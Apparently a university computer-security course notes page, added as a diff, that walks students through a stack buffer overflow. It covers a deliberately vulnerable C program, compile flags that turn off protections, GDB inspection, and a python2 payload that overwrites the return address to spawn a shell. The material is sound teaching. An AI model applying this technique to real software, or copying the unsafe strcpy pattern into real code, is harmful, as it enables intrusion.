@@ -1,0 +1,698 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+        <meta name="author" content="Deian Stefan">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.5.0">
+    
+    
+      
+        <title>Stack smashing - Computer Security</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#3f51b5">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../css/extra.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#code-and-environment-inspection" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="Computer Security" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Computer Security
+            </span>
+            <span class="md-header-nav__topic">
+              
+                Stack smashing
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="Computer Security" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Computer Security
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="About" class="md-nav__link">
+      About
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../syllabus/" title="Syllabus" class="md-nav__link">
+      Syllabus
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../contact/" title="Contact Info and Office Hours" class="md-nav__link">
+      Contact Info and Office Hours
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Assignments
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Assignments
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../pa/pa1/" title="Assignment 1" class="md-nav__link">
+      Assignment 1
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
+    
+    <label class="md-nav__link" for="nav-5">
+      Notes
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Notes
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Stack smashing
+      </label>
+    
+    <a href="./" title="Stack smashing" class="md-nav__link md-nav__link--active">
+      Stack smashing
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#code-and-environment-inspection" class="md-nav__link">
+    Code and environment inspection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overflowing-the-buffer" class="md-nav__link">
+    Overflowing the buffer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gef" class="md-nav__link">
+    GEF
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#code-and-environment-inspection" class="md-nav__link">
+    Code and environment inspection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overflowing-the-buffer" class="md-nav__link">
+    Overflowing the buffer
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gef" class="md-nav__link">
+    GEF
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>Stack smashing</h1>
+                
+                <p>We're going to walk through the example from class, carrying out a simple stack
+buffer overflow attack.</p>
+<p>To get started, create a file called example2.c with the example code:</p>
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">bar</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hello all!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">func</span><span class="p">(</span><span class="mh">0xaaaaaaaa</span><span class="p">,</span><span class="mh">0xbbbbbbbb</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>Then compile the program with GCC:</p>
+<div class="codehilite"><pre><span></span><span class="err">gcc -m32 -O0 -ggdb -static -U_FORTIFY_SOURCE -fno-stack-protector -zexecstack -no-pie -o example2 example2.c</span>
+</pre></div>
+
+
+<p>You'll note that we compiled this program with a bunch of flags. These
+flags disable many protection mechanism that would make such an attack
+harder to carry out. We'll see in class what most of these are.</p>
+<h2 id="code-and-environment-inspection">Code and environment inspection<a class="headerlink" href="#code-and-environment-inspection" title="Permanent link">&para;</a></h2>
+<p>Our first goal is to manually modify the stack frames to change the
+return address in <code>fun</code> to jump (when it returns) to the beginning of
+<code>foo</code>, instead of returning back to <code>main</code>.</p>
+<p>To get started, let's start GDB:</p>
+<div class="codehilite"><pre><span></span>$ gdb example2
+</pre></div>
+
+
+<p>Within GDB let's set a breakpoint on <code>func</code> and run the program with argument
+<code>"AAAA"</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; b func</span>
+<span class="err">&gt; set args &quot;AAAA&quot;</span>
+<span class="err">&gt; r</span>
+</pre></div>
+
+
+<p>To figure out where to jump to, let's first look at the what's on the stack
+frame:</p>
+<p>Recall that the first argument is off by 8:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; x $ebp+8</span>
+<span class="c">0xffffced0:     0xaaaaaaaa</span>
+</pre></div>
+
+
+<p>The second argument is at offset 12:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; x $ebp+12</span>
+<span class="c">0xffffced4:     0xbbbbbbbb</span>
+</pre></div>
+
+
+<p>The old <code>$ebp</code> is at offset 0:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; x $ebp</span>
+<span class="c">0xffffcec8:     0xffffcee8</span>
+</pre></div>
+
+
+<p>If our function returns normally, the <code>$ebp</code> will be set to <code>0xffffcee8</code>. If
+you want to see this, set a breakpoint right after the <code>strcpy</code> (<code>b 17</code>),
+continue (<code>c</code> in GDB) and then step through (<code>s</code>). You can also stop at the
+exact <code>leave</code> instruction by setting a break point at the address:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; b *0x8049c1e</span>
+</pre></div>
+
+
+<p>You can find such addresses with <code>disas</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; disas func</span>
+<span class="err">Dump of assembler code for function func:</span>
+<span class="err">   0x08049bee &lt;+0&gt;:     push   %ebp</span>
+<span class="err">   0x08049bef &lt;+1&gt;:     mov    %esp,%ebp</span>
+<span class="err">   0x08049bf1 &lt;+3&gt;:     push   %ebx</span>
+<span class="err">   0x08049bf2 &lt;+4&gt;:     sub    $0x14,%esp</span>
+<span class="err">   0x08049bf5 &lt;+7&gt;:     call   0x8049c68 &lt;__x86.get_pc_thunk.ax&gt;</span>
+<span class="err">   0x08049bfa &lt;+12&gt;:    add    $0x96406,%eax</span>
+<span class="err">   0x08049bff &lt;+17&gt;:    movl   $0xdeadbeef,-0xc(%ebp)</span>
+<span class="err">   0x08049c06 &lt;+24&gt;:    sub    $0x8,%esp</span>
+<span class="err">   0x08049c09 &lt;+27&gt;:    pushl  0x10(%ebp)</span>
+<span class="err">   0x08049c0c &lt;+30&gt;:    lea    -0x10(%ebp),%edx</span>
+<span class="err">   0x08049c0f &lt;+33&gt;:    push   %edx</span>
+<span class="err">   0x08049c10 &lt;+34&gt;:    mov    %eax,%ebx</span>
+<span class="err">   0x08049c12 &lt;+36&gt;:    call   0x8049028</span>
+<span class="err">   0x08049c17 &lt;+41&gt;:    add    $0x10,%esp</span>
+<span class="err">   0x08049c1a &lt;+44&gt;:    nop</span>
+<span class="err">   0x08049c1b &lt;+45&gt;:    mov    -0x4(%ebp),%ebx</span>
+<span class="err">   0x08049c1e &lt;+48&gt;:    leave</span>
+<span class="err">   0x08049c1f &lt;+49&gt;:    ret</span>
+<span class="err">End of assembler dump.</span>
+</pre></div>
+
+
+<blockquote>
+<p>NOTE: This address will likely be different on your machine.</p>
+</blockquote>
+<p>Where is the return address? It's 4 off the <code>$ebp</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; x $ebp+4</span>
+<span class="c">0xffffcecc:     0x08049c58</span>
+</pre></div>
+
+
+<p>Now what is this <code>0x08049c58</code> value? It's the address in <code>main</code> right after the
+call to <code>func</code> ( which is at address <code>0x8039bee</code>):</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; disas main</span>
+<span class="err">Dump of assembler code for function main:</span>
+<span class="err">   0x08049c20 &lt;+0&gt;:     lea    0x4(%esp),%ecx</span>
+<span class="err">     ...</span>
+<span class="err">   0x08049c53 &lt;+51&gt;:    call   0x8049bee &lt;func&gt;</span>
+<span class="err">   0x08049c58 &lt;+56&gt;:    add    $0x10,%esp</span>
+<span class="err">    ...</span>
+<span class="err">End of assembler dump.</span>
+</pre></div>
+
+
+<p>Great. Now to to direct the control flow to <code>foo</code> instead of back to <code>main</code> we
+just need to overwrite the return address. We can do this by setting <code>$ebp+4</code>:</p>
+<p>We can do this by getting <code>foo</code>'s address:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt;  p &amp;foo</span>
+<span class="err">$2 = (void (*)()) 0x8049bc0 &lt;foo&gt;</span>
+<span class="err">&gt; set {int}($ebp+4)=0x8049bc0</span>
+</pre></div>
+
+
+<p>Or more simply:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; set {int}($ebp+4)=&amp;foo</span>
+</pre></div>
+
+
+<p>Now if you continue (<code>c</code>) the <code>ret</code> will jump to <code>0x8049bc0</code> and print:</p>
+<div class="codehilite"><pre><span></span><span class="err">hello all!!</span>
+</pre></div>
+
+
+<p>As an attacker, we need to overflow the buffer to write the return address
+though. We can't attach GDB to a process we don't control.</p>
+<h2 id="overflowing-the-buffer">Overflowing the buffer<a class="headerlink" href="#overflowing-the-buffer" title="Permanent link">&para;</a></h2>
+<p>So, let's overflow the buffer. To see the effects of the overflow make sure you
+set the breakpoint after <code>strcpy</code> and let's change the args to go just past
+<code>buf</code> 4-byte boundary:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; b 17</span>
+<span class="err">&gt; set args</span>
+<span class="err">&gt; set args &quot;AAAABC&quot;</span>
+<span class="err">&gt; r</span>
+</pre></div>
+
+
+<p>If you print the local variable <code>c</code> before and after the <code>strcpy</code> you'll see
+that we've overflow from <code>buf</code> into <code>c</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; p c</span>
+<span class="err">$14 = 0xdeadbeef</span>
+<span class="err">&gt; c</span>
+<span class="err">&gt; p c</span>
+<span class="err">$15 = 0xde004342</span>
+</pre></div>
+
+
+<p>You'll notice that <code>c</code> changed from <code>0xdeadbeef</code> to <code>0xde004242</code>, i.e.,
+<code>0xde"\0CB"</code>. If we then change the args to <code>"AAAABCD"</code> you'll see that <code>c =
+0x00444342</code>.</p>
+<p>But we need to overflow the return address. How do we figure out how much we
+need to overflow? Compute the distance between the return address and buffer
+start. In <code>func</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; p $ebp+4-&amp;buf[0]</span>
+<span class="err">$16 = 0x14</span>
+</pre></div>
+
+
+<p>This means that we need to supply an arugment that is 20 bytes long (0x14) to
+get up to the return address. Let's do that:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; set args &quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;</span>
+<span class="err">&gt; r</span>
+</pre></div>
+
+
+<p>Now if you inspect the contents of the return addresss (after <code>strcpy</code>) you'll
+see it filled with all <code>F</code>s:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; x $ebp+4</span>
+<span class="c">0xffffcebc:     0x46464646</span>
+</pre></div>
+
+
+<p>If you let this program continue it will crash with:</p>
+<blockquote>
+<p>Cannot access memory at address 0x46464646</p>
+</blockquote>
+<p>Why? We'll we're trying to read the instruction at address <code>0x46464646</code> to
+execute it. That's not a valid address. Let's instead point the program to
+<code>foo</code> (<code>0x8049bc0</code>):</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; set args $(python2 -c &quot;print &#39;AAAABBBBCCCCDDDDEEEE\xc0\x9b\x04\x08&#39;&quot;)</span>
+<span class="err">&gt; r</span>
+</pre></div>
+
+
+<p>Now if you run the program it will print <code>hello all</code>.</p>
+<p>We can do all of this from the shell:</p>
+<div class="codehilite"><pre><span></span>$ ./example2 <span class="sb">`</span>python2 -c <span class="s2">&quot;print &#39;AAAABBBBCCCCDDDDEEEE\xc0\x9b\x04\x08&#39;&quot;</span><span class="sb">`</span>
+hello all!!
+</pre></div>
+
+
+<p>In practice you'll want to get a shell. In our example we can get a shell by
+setting the return address to <code>bar</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">&gt; p &amp;bar</span>
+<span class="err">$35 = (void (*)()) 0x8049b95 &lt;bar&gt;</span>
+<span class="err">&gt; set args $(python2 -c &quot;print &#39;AAAABBBBCCCCDDDDEEEE\x95\x9b\x04\x08&#39;&quot;)</span>
+<span class="err">&gt; r</span>
+<span class="err">sh-5.0$</span>
+</pre></div>
+
+
+<p>Realistically you won't have a nice function like <code>bar</code> in the process and
+you'll need to essentially mock a call to <code>system</code> yourself. You can do this by
+overflowing the buffer with your (shell) code and have the return address point
+to your code instead of existing functions. You'll get to do this in one of you
+assignments!</p>
+<h2 id="gef">GEF<a class="headerlink" href="#gef" title="Permanent link">&para;</a></h2>
+<p>You may find <a href="https://gef.readthedocs.io/en/master/">GEF</a> helpful throught the
+quarter.  I like ATT synax for x86: <code>set disassembly-flavor att</code> and like the
+stack growing downwards to match slides (<code>gef config context.grow_stack_down
+True</code>).</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../pa/pa1/" title="Assignment 1" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Assignment 1
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://github.com/PLSysSec/cse127-website" class="md-footer-social__link fa fa-github"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.a8b5e56f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
